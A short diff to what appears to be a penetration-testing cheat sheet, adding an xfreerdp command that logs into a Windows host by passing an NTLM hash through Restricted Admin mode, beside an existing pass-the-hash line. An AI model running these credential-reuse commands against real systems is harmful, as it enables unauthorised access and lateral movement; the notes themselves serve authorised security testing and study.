@@ -169,7 +169,8 @@ Then log in using xfreerdp
 
 ```powershell
 xfreerdp /u:offsec /d:win2012 /pth:88a405e17c0aa5debbc9b5679753939d /v:10.0.0.1 # pass the hash works for Server 2012 R2 / Win 8.1+
- xfreerd /u:runner /v:10.0.0.1 # password will be asked
+xfreerdp -u test -p 36374BD2767773A2DD4F6B010EC5EE0D 192.168.226.129 # pass the hash using Restricted Admin, need an admin account not in the "Remote Desktop Users" group.
+xfreerd /u:runner /v:10.0.0.1 # password will be asked
 ```
 
 
